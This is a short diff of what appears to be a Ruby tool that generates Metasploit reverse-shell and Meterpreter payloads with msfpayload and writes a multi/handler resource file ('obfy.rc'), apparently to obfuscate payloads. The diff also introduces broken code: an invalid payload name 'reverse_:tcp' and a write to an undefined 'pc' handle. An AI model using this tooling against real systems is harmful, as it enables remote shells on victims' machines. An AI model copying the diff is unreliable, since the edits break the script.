@@ -94,7 +94,7 @@ case PAYLOAD
   when "1"
   payload_name = "windows/shell/reverse_tcp"
   when "2"
-  payload_name = "windows/meterpreter/reverse_tcp"
+  payload_name = "windows/meterpreter/reverse_:tcp"
   when "3"
   payload_name = "windows/meterpreter/reverse_https"
   when "4"
@@ -127,6 +127,7 @@ if payload_num < 5
   %x{msfpayload #{payload_name} LHOST=#{LHOST} LPORT=#{LPORT} R > #{raw_file}}
   #Making the rc file
   rc = File.new("obfy.rc", "w+")
+  pc.puts "sleep 3"
   rc.puts "use exploit/multi/handler"
   rc.puts "set payload #{payload_name}"
   rc.puts "set LHOST #{LHOST}"
